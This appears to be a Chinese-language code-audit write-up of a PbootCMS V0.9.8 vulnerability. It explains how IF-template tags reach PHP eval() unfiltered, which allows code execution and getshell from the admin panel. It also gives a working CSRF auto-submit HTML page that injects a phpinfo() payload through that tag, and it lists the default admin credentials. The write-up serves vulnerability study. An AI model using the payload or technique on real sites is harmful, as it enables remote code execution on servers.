# ****P**** ** **bootCMS**** ** **历史漏洞分析**** ** **0x01****

V0.9.8

php代码审计的初学者，所以就先从D类CMS入手。

后台默认账号：admin 密码：123456

代码审计分：

> 危险函数追踪流
>
> 通读全文流
>
> 黑白盒结合审计流

## 开发者标签手册

### IF条件语句

注意：条件语句中字符串需要用单引号或双引号，条件也可以使用原生PHP代码； 所有对其它标签的调用都为字符串，需要加单引号。​

    
    
    {pboot:if('a'=='b')}
    内容1
    {else}
    内容2
    {/pboot:if}

示例一：在IF中使用PHP函数示例：

    
    
    {pboot:if(date('Y')==2018)}2018年{/pboot:if}

示例二：高亮栏目示例：

    
    
    <div class="nav">
    <dl>
      <dt><a href="{pboot:sitepath}/" {pboot:if(0=='{sort:scode}')}class='active'{/pboot:if}>首页</a></dt>
    </dl>
    {pboot:nav parent=0}
    <dl>
    <dt><a href="[nav:link]" {pboot:if('[nav:scode]'=='{sort:tcode}')}class='active'{/pboot:if}>[nav:name]</a></dt>
    <dd>
    {pboot:2nav parent=[nav:scode]}
    <a href="[2nav:link]" {pboot:if('[2nav:scode]'=='{sort:scode}')}class='active'{/pboot:if}>[2nav:name]</a> |
    {/pboot:2nav}
    </dd>
    </dl>
    {/pboot:nav}
    </div>

示例三：嵌套IF：

    
    
    {pboot:if('a'=='b')}
    {pboot:2if('a'=='b')}
    内容1
    {2else}
    内容2
    {/pboot:2if}
    {else}
    内容3
    {/pboot:if}

这里说了可执行PHP语句，但要插在IF条件标签，例如：

    
    
    {pboot:if(php语句)} {/pboot:if}

然后再返回文件查看源代码文件：

该文件是：标签解析引擎控制器，也就是解析标签的。

代码的1273~1314为关于IF条件语句的。

    
    
    /apps/home/controller/ParserController.php
    
     // 解析IF条件标签
     public function parserIfLabel($content)
    {
         $pattern = '/\{pboot:if\(([^}]+)\)\}([\s\S]*?)\{\/pboot:if\}/';
         $pattern2 = '/pboot:([0-9])+if/';
         if (preg_match_all($pattern, $content, $matches)) {
             $count = count($matches[0]);
             for ($i = 0; $i < $count; $i ++) {
                 $flag = '';
                 $out_html = '';
                 eval('if(' . $matches[1][$i] . '){$flag="if";}else{$flag="else";}');
                 
                 if (preg_match('/([\s\S]*)?\{else\}([\s\S]*)?/', $matches[2][$i], $matches2)) { // 判断是否存在else
                     switch ($flag) {
                         case 'if': // 条件为真
                             if (isset($matches2[1])) {
                                 $out_html = $matches2[1];
                            }
                             break;
                         case 'else': // 条件为假
                             if (isset($matches2[2])) {
                                 $out_html = $matches2[2];
                            }
                             break;
                    }
                } elseif ($flag == 'if') {
                     $out_html = $matches[2][$i];
                }
                 
                 // 无限极嵌套解析
                 if (preg_match($pattern2, $out_html, $matches3)) {
                     $out_html = str_replace('pboot:' . $matches3[1] . 'if', 'pboot:if', $out_html);
                     $out_html = str_replace('{' . $matches3[1] . 'else}', '{else}', $out_html);
                     $out_html = $this->parserIfLabel($out_html);
                }
                 
                 // 执行替换
                 $content = str_replace($matches[0][$i], $out_html, $content);
            }
        }
         return $content;
    }

关键在：

  

    
    
    $pattern = '/\{pboot:if\(([^}]+)\)\}([\s\S]*?)\{\/pboot:if\}/';
         $pattern2 = '/pboot:([0-9])+if/';
         if (preg_match_all($pattern, $content, $matches)) {
             $count = count($matches[0]);
             for ($i = 0; $i < $count; $i ++) {
                 $flag = '';
                 $out_html = '';
                 eval('if(' . $matches[1][$i] . '){$flag="if";}else{$flag="else";}');

只经过简单的正则匹配之后就赋值，然后eval()执行。

到此需要寻在利用点。

## Poc

Poc:

【隐去】

最后经过寻找，只要发现后台能编辑的地方，基本上都能插入IF条件语句标签并能解析执行。

访问首页就可以看到phpinfo页面

然后尝试了多次多点均能Getshell.

## 另外

前台某处存在CSRF，利用其修改后台内容，但均有提升修改成功的页面，做不到无感知修改内容，因此CSRF+IF条件语句标签也是比较鸡肋。

    
    
    #csrf.html poc
    
    <html>
    
    <body>
    
    <form action="http://test.com/admin.php/Message/mod/id/19.html?backurl=/index.php" method="POST" name="form1">
    
    <input type="hidden" name="recontent" value="thank you{pboot:if(phpinfo()==1)}!{/pboot:if}" />
    
    <input type="hidden" name="status" value="1" />
    
    <input type="submit" value="" />
    
    </form>
    
    <script type="text/javascript">
    
    setTimeout("form1.submit();",100);
    
    </script>
    
    </body>
    
    </html>

